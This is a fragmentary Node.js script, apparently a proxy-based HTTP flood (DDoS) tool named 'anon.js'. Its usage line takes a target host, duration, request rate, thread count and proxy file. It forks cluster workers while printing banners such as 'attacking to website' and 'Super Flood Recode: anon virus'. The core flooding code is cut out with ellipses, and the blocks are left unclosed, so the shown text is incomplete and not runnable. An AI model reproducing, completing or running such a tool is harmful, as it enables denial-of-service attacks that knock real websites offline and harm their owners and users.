const net = require("net");
 ...
 if (process.argv.length < 7){console.log(`</>node anon.js Target Host Time Requests Thead ProxyFile </>`.rainbow); process.exit();}
 const headers = {};
...
site_header = [
 ...
 if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        console.clear();
console.log(`𝐅𝐋𝐎𝐎𝐃 : 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝟐.𝟎`.gray)
console.log("𝐒𝐭𝐚𝐮𝐬: ".yellow + "| ᴀттᴀcκιɴԍ тo wᴇʙsιтᴇ |".rainbow);
...
console.log(`𝐍𝐨𝐝𝐞:`.blue + "𝐒𝐮𝐩𝐞𝐫 𝐅𝐥𝐨𝐨𝐝 𝐑𝐞𝐜𝐨𝐝𝐞 : ᴀɴᴏɴ ᴠɪʀᴜs".white);
cluster.fork();
